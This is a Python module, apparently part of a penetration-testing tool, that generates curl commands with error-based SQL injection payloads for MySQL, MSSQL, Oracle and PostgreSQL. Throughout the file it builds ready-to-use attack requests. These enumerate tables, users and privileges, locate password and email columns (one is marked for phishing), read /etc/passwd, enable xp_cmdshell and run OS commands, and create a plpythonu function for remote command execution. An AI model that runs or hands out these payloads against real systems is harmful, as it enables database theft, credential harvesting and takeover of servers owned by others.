#!/usr/bin/env python3
"""
Database-Specific SQL Injection Enumeration
Provides enumeration steps and curl commands for different database systems
"""

from urllib.parse import parse_qs


class DatabaseEnumeration:
    """Database-specific enumeration strategies for SQLi exploitation"""

    @staticmethod
    def get_enumeration_steps(db_type, param, method, target, post_params=None):
        """
        Get database-specific enumeration steps

        Args:
            db_type: Database type (mysql, mssql, oracle, postgresql)
            param: Vulnerable parameter name
            method: HTTP method (GET/POST)
            target: Target URL
            post_params: POST parameters if applicable

        Returns:
            List of enumeration step dictionaries
        """
        db_type = db_type.lower()

        if 'mysql' in db_type:
            return DatabaseEnumeration._mysql_steps(param, method, target, post_params)
        elif 'mssql' in db_type:
            return DatabaseEnumeration._mssql_steps(param, method, target, post_params)
        elif 'oracle' in db_type:
            return DatabaseEnumeration._oracle_steps(param, method, target, post_params)
        elif 'postgresql' in db_type or 'postgres' in db_type:
            return DatabaseEnumeration._postgresql_steps(param, method, target, post_params)
        else:
            return []

    @staticmethod
    def _mysql_steps(param, method, target, post_params):
        """MySQL error-based enumeration steps"""

        steps = [
            {
                'title': 'Extract Database Version',
                'payload': "1' AND extractvalue(1,concat(0x7e,version()))--",
                'grep_pattern': '| grep -i "xpath" -A2',
                'purpose': 'Use EXTRACTVALUE() to trigger MySQL error revealing version',
                'what_to_look_for': 'MySQL version number after "~" in XPATH syntax error'
            },
            {
                'title': 'Extract Current Database Name',
                'payload': "1' AND extractvalue(1,concat(0x7e,database()))--",
                'grep_pattern': '| grep -i "xpath" -A2',
                'purpose': 'Get current database name for table enumeration',
                'what_to_look_for': 'Database name after "~" in error message'
            },
            {
                'title': 'Extract Current User',
                'payload': "1' AND extractvalue(1,concat(0x7e,user()))--",
                'grep_pattern': '| grep -i "xpath" -A2',
                'purpose': 'Check privilege level (root@localhost is highest)',
                'what_to_look_for': 'Username@host after "~" in error'
            },
            {
                'title': 'Enumerate Table Names',
                'payload': "1' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0)))--",
                'grep_pattern': '| grep -i "xpath" -A2',
                'purpose': 'Extract table names one by one from current database',
                'what_to_look_for': 'Table name after "~" in error',
                'iterate_note': 'Change OFFSET 0 to 1, 2, 3... to enumerate all tables'
            },
            {
                'title': 'Extract Column Names',
                'payload': "1' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='TABLENAME' LIMIT 1 OFFSET 0)))--",
                'grep_pattern': '| grep -i "xpath" -A2',
                'purpose': 'Extract columns from discovered tables',
                'what_to_look_for': 'Column name after "~" in error',
                'requires_input': 'TABLENAME',
                'iterate_note': 'Change OFFSET to enumerate all columns'
            }
        ]

        return DatabaseEnumeration._build_curl_commands(steps, param, method, target, post_params)

    @staticmethod
    def _mssql_steps(param, method, target, post_params):
        """MSSQL error-based enumeration steps"""

        steps = [
            {
                'title': 'Extract Database Version',
                'payload': "1' AND 1=CONVERT(int,@@version)--",
                'grep_pattern': '| grep -i "conversion\\|convert" -A2',
                'purpose': 'Use CONVERT() type mismatch to reveal MSSQL version',
                'what_to_look_for': 'Microsoft SQL Server version in conversion error'
            },
            {
                'title': 'Extract Current Database Name',
                'payload': "1' AND 1=CONVERT(int,DB_NAME())--",
                'grep_pattern': '| grep -i "conversion\\|convert" -A2',
                'purpose': 'Get current database name for enumeration',
                'what_to_look_for': 'Database name in conversion error'
            },
            {
                'title': 'Extract Current User',
                'payload': "1' AND 1=CONVERT(int,SYSTEM_USER)--",
                'grep_pattern': '| grep -i "conversion\\|convert" -A2',
                'purpose': 'Check privilege level (sa is sysadmin)',
                'what_to_look_for': 'Username in error (sa = full control)'
            },
            {
                'title': 'Enumerate Table Names',
                'payload': "1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name NOT IN (SELECT TOP 0 name FROM sysobjects WHERE xtype='U')))--",
                'grep_pattern': '| grep -i "conversion\\|convert" -A2',
                'purpose': 'Extract table names using TOP clause (MSSQL-specific)',
                'what_to_look_for': 'Table name in error',
                'iterate_note': 'Change TOP 0 to TOP 1, TOP 2, etc. to enumerate all tables'
            },
            {
                'title': 'Extract Column Names',
                'payload': "1' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='TABLENAME'))--",
                'grep_pattern': '| grep -i "conversion\\|convert" -A2',
                'purpose': 'Extract columns from discovered tables',
                'what_to_look_for': 'Column name in conversion error',
                'requires_input': 'TABLENAME',
                'iterate_note': 'Use TOP 1/TOP 2/etc. to enumerate all columns'
            }
        ]

        return DatabaseEnumeration._build_curl_commands(steps, param, method, target, post_params)

    @staticmethod
    def _oracle_steps(param, method, target, post_params):
        """Oracle error-based enumeration steps"""

        steps = [
            {
                'title': 'Extract Database Version',
                'payload': "1' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS NUMBER)--",
                'grep_pattern': '| grep -i "invalid number" -A2',
                'purpose': 'Use NUMBER conversion error to reveal Oracle version',
                'what_to_look_for': 'Oracle version in "invalid number" error'
            },
            {
                'title': 'Extract Current Database/Schema',
                'payload': "1' AND 1=CAST((SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual) AS NUMBER)--",
                'grep_pattern': '| grep -i "invalid number" -A2',
                'purpose': 'Get current schema name',
                'what_to_look_for': 'Schema name in error message'
            },
            {
                'title': 'Extract Current User',
                'payload': "1' AND 1=CAST((SELECT USER FROM dual) AS NUMBER)--",
                'grep_pattern': '| grep -i "invalid number" -A2',
                'purpose': 'Check privilege level (SYS/SYSTEM are DBA)',
                'what_to_look_for': 'Username in error'
            },
            {
                'title': 'Enumerate Table Names',
                'payload': "1' AND 1=CAST((SELECT table_name FROM all_tables WHERE ROWNUM=1 AND table_name NOT IN ('TABLE1')) AS NUMBER)--",
                'grep_pattern': '| grep -i "invalid number" -A2',
                'purpose': 'Extract table names using ROWNUM (Oracle-specific)',
                'what_to_look_for': 'Table name in error',
                'iterate_note': "Add discovered tables to NOT IN clause: ('TABLE1','TABLE2',...)"
            },
            {
                'title': 'Extract Column Names',
                'payload': "1' AND 1=CAST((SELECT column_name FROM all_tab_columns WHERE table_name='TABLENAME' AND ROWNUM=1) AS NUMBER)--",
                'grep_pattern': '| grep -i "invalid number" -A2',
                'purpose': 'Extract columns from discovered tables',
                'what_to_look_for': 'Column name in error',
                'requires_input': 'TABLENAME',
                'iterate_note': 'Add discovered columns to NOT IN clause'
            }
        ]

        return DatabaseEnumeration._build_curl_commands(steps, param, method, target, post_params)

    @staticmethod
    def _postgresql_steps(param, method, target, post_params):
        """PostgreSQL error-based enumeration steps"""

        steps = [
            {
                'title': 'Extract Database Version',
                'payload': "1' AND 1=CAST((SELECT version()) AS int)--",
                'grep_pattern': '| grep -i "invalid input" -A2',
                'purpose': 'PostgreSQL requires CAST() instead of CONVERT(). Error will reveal version.',
                'what_to_look_for': 'PostgreSQL version number in error message (e.g., "PostgreSQL 13.2 on x86_64-pc-linux-gnu")'
            },
            {
                'title': 'Extract Current Database Name',
                'payload': "1' AND 1=CAST((SELECT current_database()) AS int)--",
                'grep_pattern': '| grep -i "invalid\\|error" -A2',
                'purpose': 'Get database name for table enumeration',
                'what_to_look_for': 'Database name in "invalid input syntax" error'
            },
            {
                'title': 'Extract Current User',
                'payload': "1' AND 1=CAST((SELECT current_user) AS int)--",
                'grep_pattern': '| grep -i "invalid\\|error" -A2',
                'purpose': 'Check privilege level (superuser access needed for RCE)',
                'what_to_look_for': 'Username in error, check if ends with "postgres" (superuser)'
            },
            {
                'title': 'Enumerate Table Names',
                'payload': "1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS int)--",
                'grep_pattern': '| grep -i "invalid" -A2',
                'purpose': 'Extract table names one by one',
                'what_to_look_for': 'Table name in error. Iterate: Change OFFSET 0 to 1, 2, 3...',
                'iterate_note': 'Change OFFSET 0 to 1, 2, 3... to enumerate all tables'
            },
            {
                'title': 'Extract Column Names',
                'payload': "1' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='TABLENAME' LIMIT 1 OFFSET 0) AS int)--",
                'grep_pattern': '| grep -i "invalid" -A2',
                'purpose': 'Extract columns from discovered tables',
                'what_to_look_for': 'Column name in error. Replace TABLENAME with actual table',
                'requires_input': 'TABLENAME'
            }
        ]

        return DatabaseEnumeration._build_curl_commands(steps, param, method, target, post_params)

    @staticmethod
    def _build_curl_commands(steps, param, method, target, post_params):
        """Build curl commands for each enumeration step"""

        formatted_steps = []

        for step in steps:
            if method == 'POST' and post_params:
                data_copy = post_params.copy()
                data_copy[param] = [step['payload']]
                data_str = '&'.join([f"{k}={v[0] if isinstance(v, list) else v}"
                                    for k, v in data_copy.items()])

                curl_cmd = f"curl -X POST {target} \\\n  -d \"{data_str}\" \\\n  {step['grep_pattern']}"
            else:
                # GET request
                curl_cmd = f"curl \"{target}?{param}={step['payload']}\" \\\n  {step['grep_pattern']}"

            formatted_steps.append({
                'title': step['title'],
                'curl': curl_cmd,
                'purpose': step['purpose'],
                'what_to_look_for': step['what_to_look_for'],
                'iterate_note': step.get('iterate_note'),
                'requires_input': step.get('requires_input')
            })

        return formatted_steps

    @staticmethod
    def get_followup_commands(db_type, param, method, target, post_params=None):
        """Generate database-specific follow-up enumeration commands"""

        if db_type.lower() == 'mysql':
            return DatabaseEnumeration._mysql_followup(param, method, target, post_params)
        elif db_type.lower() == 'mssql':
            return DatabaseEnumeration._mssql_followup(param, method, target, post_params)
        elif db_type.lower() == 'postgresql':
            return DatabaseEnumeration._postgresql_followup(param, method, target, post_params)
        elif db_type.lower() == 'oracle':
            return DatabaseEnumeration._oracle_followup(param, method, target, post_params)
        else:
            # Generic follow-up commands
            return DatabaseEnumeration._generic_followup(param, method, target, post_params)

    @staticmethod
    def _mysql_followup(param, method, target, post_params):
        """MySQL-specific follow-up commands"""
        commands = {
            'Counting Operations': [
                {
                    'title': 'Count Total Tables',
                    'payload': "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS int)--",
                    'description': 'Get total number of tables in all databases',
                    'look_for': 'Number in error message (e.g., "value 142")'
                },
                {
                    'title': 'Count Tables in Current DB',
                    'payload': "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) AS int)--",
                    'description': 'Count tables in current database only',
                    'look_for': 'Smaller number for current DB tables'
                },
                {
                    'title': 'Count Users',
                    'payload': "' AND 1=CAST((SELECT COUNT(DISTINCT user) FROM mysql.user) AS int)--",
                    'description': 'Total number of MySQL users',
                    'look_for': 'User count in error'
                },
                {
                    'title': 'Count Rows in Table',
                    'payload': "' AND 1=CAST((SELECT COUNT(*) FROM TABLENAME) AS int)--",
                    'description': 'Count rows in specific table',
                    'look_for': 'Row count for data volume assessment',
                    'requires_input': 'TABLENAME'
                }
            ],
            'Privilege Enumeration': [
                {
                    'title': 'Current User Privileges',
                    'payload': "' AND 1=CAST((SELECT GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges WHERE grantee=CONCAT(\"'\",current_user(),\"'\")) AS int)--",
                    'description': 'List all privileges for current user',
                    'look_for': 'FILE, SUPER, CREATE, DROP privileges'
                },
                {
                    'title': 'Check FILE Privilege',
                    'payload': "' AND IF((SELECT COUNT(*) FROM information_schema.user_privileges WHERE grantee=CONCAT(\"'\",current_user(),\"'\") AND privilege_type='FILE')>0, 1=CAST('has_file' AS int), 1)--",
                    'description': 'Check if user can read/write files',
                    'look_for': 'Error with "has_file" = FILE privilege exists'
                },
                {
                    'title': 'Check SUPER Privilege',
                    'payload': "' AND IF((SELECT COUNT(*) FROM information_schema.user_privileges WHERE grantee=CONCAT(\"'\",current_user(),\"'\") AND privilege_type='SUPER')>0, 1=CAST('is_super' AS int), 1)--",
                    'description': 'Check for SUPER user status',
                    'look_for': 'Error with "is_super" = admin access'
                },
                {
                    'title': 'List All User Grants',
                    'payload': "' AND 1=CAST((SELECT GROUP_CONCAT(DISTINCT privilege_type) FROM information_schema.schema_privileges WHERE grantee=CONCAT(\"'\",current_user(),\"'\")) AS int)--",
                    'description': 'Schema-level privileges',
                    'look_for': 'INSERT, UPDATE, DELETE, SELECT permissions'
                }
            ],
            'Sensitive Data Discovery': [
                {
                    'title': 'Find User Tables',
                    'payload': "' AND 1=CAST((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() AND (table_name LIKE '%user%' OR table_name LIKE '%admin%' OR table_name LIKE '%login%')) AS int)--",
                    'description': 'Find tables with user/admin data',
                    'look_for': 'Table names containing credentials'
                },
                {
                    'title': 'Find Password Columns',
                    'payload': "' AND 1=CAST((SELECT GROUP_CONCAT(CONCAT(table_name,'.',column_name)) FROM information_schema.columns WHERE table_schema=database() AND (column_name LIKE '%pass%' OR column_name LIKE '%pwd%')) AS int)--",
                    'description': 'Locate password fields',
                    'look_for': 'table.column with passwords'
                },
                {
                    'title': 'Find Email Columns',
                    'payload': "' AND 1=CAST((SELECT GROUP_CONCAT(CONCAT(table_name,'.',column_name)) FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%email%') AS int)--",
                    'description': 'Find email addresses for phishing/OSINT',
                    'look_for': 'table.column with emails'
                }
            ],
            'Advanced Enumeration': [
                {
                    'title': 'Read Local Files (if FILE privilege)',
                    'payload': "' AND 1=CAST((SELECT LOAD_FILE('/etc/passwd')) AS int)--",
                    'description': 'Attempt to read system files',
                    'look_for': 'File contents in error (requires FILE privilege)'
                },
                {
                    'title': 'Database Write Directory',
                    'payload': "' AND 1=CAST((SELECT @@secure_file_priv) AS int)--",
                    'description': 'Check where MySQL can write files',
                    'look_for': 'Directory path or NULL (unrestricted)'
                },
                {
                    'title': 'MySQL Version Details',
                    'payload': "' AND 1=CAST((SELECT CONCAT(@@version,':',@@version_compile_os,':',@@hostname)) AS int)--",
                    'description': 'Full version, OS, and hostname',
                    'look_for': 'Version:OS:Hostname format'
                }
            ]
        }

        return DatabaseEnumeration._format_followup_commands(commands, param, method, target, post_params)

    @staticmethod
    def _mssql_followup(param, method, target, post_params):
        """MSSQL-specific follow-up commands"""
        commands = {
            'Counting Operations': [
                {
                    'title': 'Count All Tables',
                    'payload': "'; SELECT CAST(COUNT(*) AS int) FROM information_schema.tables--",
                    'description': 'Total table count',
                    'look_for': 'Conversion error with table count'
                },
                {
                    'title': 'Count Databases',
                    'payload': "'; SELECT CAST(COUNT(*) AS int) FROM sys.databases--",
                    'description': 'Number of databases on server',
                    'look_for': 'Database count in error'
                },
                {
                    'title': 'Count Logins',
                    'payload': "'; SELECT CAST(COUNT(*) AS int) FROM sys.sql_logins--",
                    'description': 'SQL Server login count',
                    'look_for': 'Login count (requires permissions)'
                }
            ],
            'Privilege Enumeration': [
                {
                    'title': 'Current User Permissions',
                    'payload': "'; SELECT CAST(permission_name AS int) FROM fn_my_permissions(NULL, 'SERVER')--",
                    'description': 'Server-level permissions',
                    'look_for': 'CONTROL SERVER, ALTER ANY LOGIN, etc.'
                },
                {
                    'title': 'Check sysadmin Role',
                    'payload': "'; IF IS_SRVROLEMEMBER('sysadmin')=1 SELECT CAST('is_sysadmin' AS int)--",
                    'description': 'Check for sysadmin privileges',
                    'look_for': 'Error with "is_sysadmin" = admin access'
                },
                {
                    'title': 'Check xp_cmdshell Status',
                    'payload': "'; SELECT CAST(value_in_use AS int) FROM sys.configurations WHERE name='xp_cmdshell'--",
                    'description': 'Check if xp_cmdshell is enabled',
                    'look_for': '1 = enabled (RCE possible), 0 = disabled'
                }
            ],
            'Sensitive Data Discovery': [
                {
                    'title': 'Find User Tables',
                    'payload': "'; SELECT CAST(STRING_AGG(name,',') AS int) FROM sys.tables WHERE name LIKE '%user%' OR name LIKE '%login%'--",
                    'description': 'Tables with potential credentials',
                    'look_for': 'Comma-separated table names'
                },
                {
                    'title': 'Find Password Columns',
                    'payload': "'; SELECT CAST(STRING_AGG(t.name+'.'+c.name,',') AS int) FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE c.name LIKE '%pass%'--",
                    'description': 'Password field locations',
                    'look_for': 'table.column format'
                }
            ],
            'Advanced Enumeration': [
                {
                    'title': 'Enable xp_cmdshell (if sysadmin)',
                    'payload': "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--",
                    'description': 'Enable command execution',
                    'look_for': 'No error = success (requires sysadmin)'
                },
                {
                    'title': 'Execute OS Command',
                    'payload': "'; EXEC xp_cmdshell 'whoami'--",
                    'description': 'Run OS commands (requires xp_cmdshell)',
                    'look_for': 'Command output or access denied'
                }
            ]
        }

        return DatabaseEnumeration._format_followup_commands(commands, param, method, target, post_params)

    @staticmethod
    def _postgresql_followup(param, method, target, post_params):
        """PostgreSQL-specific follow-up commands"""
        commands = {
            'Counting Operations': [
                {
                    'title': 'Count All Tables',
                    'payload': "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables)::int AS int)--",
                    'description': 'Total table count across all schemas',
                    'look_for': 'Number in casting error'
                },
                {
                    'title': 'Count Databases',
                    'payload': "' AND 1=CAST((SELECT COUNT(*) FROM pg_database)::int AS int)--",
                    'description': 'Number of databases',
                    'look_for': 'Database count'
                },
                {
                    'title': 'Count Users/Roles',
                    'payload': "' AND 1=CAST((SELECT COUNT(*) FROM pg_roles)::int AS int)--",
                    'description': 'PostgreSQL roles/users',
                    'look_for': 'Role count'
                }
            ],
            'Privilege Enumeration': [
                {
                    'title': 'Check Superuser Status',
                    'payload': "' AND 1=CAST((SELECT usesuper FROM pg_user WHERE usename=current_user)::int AS int)--",
                    'description': 'Check if current user is superuser',
                    'look_for': 't/true = superuser, f/false = regular'
                },
                {
                    'title': 'List User Privileges',
                    'payload': "' AND 1=CAST((SELECT string_agg(privilege_type,',') FROM information_schema.role_table_grants WHERE grantee=current_user)::int AS int)--",
                    'description': 'Table-level privileges',
                    'look_for': 'SELECT, INSERT, UPDATE, DELETE permissions'
                },
                {
                    'title': 'Check pg_read_file Access',
                    'payload': "' AND 1=CAST((SELECT has_function_privilege(current_user, 'pg_read_file(text)', 'execute'))::int AS int)--",
                    'description': 'Can read files from filesystem',
                    'look_for': 't/true = file read access'
                }
            ],
            'Sensitive Data Discovery': [
                {
                    'title': 'Find User Tables',
                    'payload': "' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE tablename LIKE '%user%' OR tablename LIKE '%account%')::int AS int)--",
                    'description': 'Tables with user data',
                    'look_for': 'Comma-separated table names'
                },
                {
                    'title': 'Find Password Columns',
                    'payload': "' AND 1=CAST((SELECT string_agg(table_name||'.'||column_name,',') FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%pwd%')::int AS int)--",
                    'description': 'Password field locations',
                    'look_for': 'table.column format'
                }
            ],
            'Advanced Enumeration': [
                {
                    'title': 'Read Files (if superuser)',
                    'payload': "' AND 1=CAST((SELECT pg_read_file('/etc/passwd'))::int AS int)--",
                    'description': 'Read system files',
                    'look_for': 'File contents (requires superuser)'
                },
                {
                    'title': 'List Database Extensions',
                    'payload': "' AND 1=CAST((SELECT string_agg(extname,',') FROM pg_extension)::int AS int)--",
                    'description': 'Installed extensions (may reveal attack vectors)',
                    'look_for': 'Extension names like plpython, dblink'
                },
                {
                    'title': 'Execute OS Command (if plpython)',
                    'payload': "'; CREATE OR REPLACE FUNCTION cmd(text) RETURNS text AS 'import os; return os.popen(args[0]).read()' LANGUAGE plpythonu; SELECT cmd('id')--",
                    'description': 'RCE via plpython extension',
                    'look_for': 'Command output or permission denied'
                }
            ]
        }

        return DatabaseEnumeration._format_followup_commands(commands, param, method, target, post_params)

    @staticmethod
    def _oracle_followup(param, method, target, post_params):
        """Oracle-specific follow-up commands"""
        commands = {
            'Counting Operations': [
                {
                    'title': 'Count All Tables',
                    'payload': "' AND 1=(SELECT COUNT(*) FROM all_tables)--",
                    'description': 'Count accessible tables',
                    'look_for': 'ORA-01722 with table count'
                },
                {
                    'title': 'Count Users',
                    'payload': "' AND 1=(SELECT COUNT(*) FROM all_users)--",
                    'description': 'Database user count',
                    'look_for': 'User count in error'
                }
            ],
            'Privilege Enumeration': [
                {
                    'title': 'Current User Privileges',
                    'payload': "' AND 1=(SELECT LISTAGG(privilege,',') WITHIN GROUP (ORDER BY privilege) FROM user_sys_privs)--",
                    'description': 'System privileges',
                    'look_for': 'CREATE SESSION, DBA role, etc.'
                },
                {
                    'title': 'Check DBA Role',
                    'payload': "' AND 1=(SELECT DECODE(COUNT(*),0,1,1/0) FROM user_role_privs WHERE granted_role='DBA')--",
                    'description': 'Check for DBA access',
                    'look_for': 'ORA-01476 = has DBA, no error = no DBA'
                }
            ],
            'Sensitive Data Discovery': [
                {
                    'title': 'Find User Tables',
                    'payload': "' AND 1=(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE table_name LIKE '%USER%')--",
                    'description': 'User-related tables',
                    'look_for': 'Table names in error'
                }
            ],
            'Advanced Enumeration': [
                {
                    'title': 'Java Execution Check',
                    'payload': "' AND 1=(SELECT dbms_java.get_ojvm_property('java.version') FROM dual)--",
                    'description': 'Check for Java support (RCE vector)',
                    'look_for': 'Java version = execution possible'
                }
            ]
        }

        return DatabaseEnumeration._format_followup_commands(commands, param, method, target, post_params)

    @staticmethod
    def _generic_followup(param, method, target, post_params):
        """Generic follow-up commands for unknown databases"""
        commands = {
            'Basic Counting': [
                {
                    'title': 'Count Tables (Generic)',
                    'payload': "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    'description': 'Try standard information_schema',
                    'look_for': 'True/false response difference'
                }
            ],
            'User Enumeration': [
                {
                    'title': 'Current User (Various)',
                    'payload': "' AND user()=user()--",
                    'description': 'MySQL/MariaDB syntax',
                    'look_for': 'True response = MySQL-like'
                },
                {
                    'title': 'Current User (Alt)',
                    'payload': "' AND current_user=current_user--",
                    'description': 'PostgreSQL syntax',
                    'look_for': 'True response = PostgreSQL'
                }
            ]
        }

        return DatabaseEnumeration._format_followup_commands(commands, param, method, target, post_params)

    @staticmethod
    def _format_followup_commands(command_categories, param, method, target, post_params):
        """Format follow-up commands into curl format"""
        formatted = {}

        for category, commands in command_categories.items():
            formatted[category] = []

            for cmd in commands:
                if method == 'POST' and post_params:
                    data_copy = post_params.copy()
                    data_copy[param] = [cmd['payload']]
                    data_str = '&'.join([f"{k}={v[0] if isinstance(v, list) else v}"
                                        for k, v in data_copy.items()])
                    curl_cmd = f"curl -X POST '{target}' -d \"{data_str}\""
                else:
                    curl_cmd = f"curl \"{target}?{param}={cmd['payload']}\""

                formatted[category].append({
                    'title': cmd['title'],
                    'curl': curl_cmd,
                    'description': cmd['description'],
                    'look_for': cmd['look_for'],
                    'requires_input': cmd.get('requires_input')
                })

        return formatted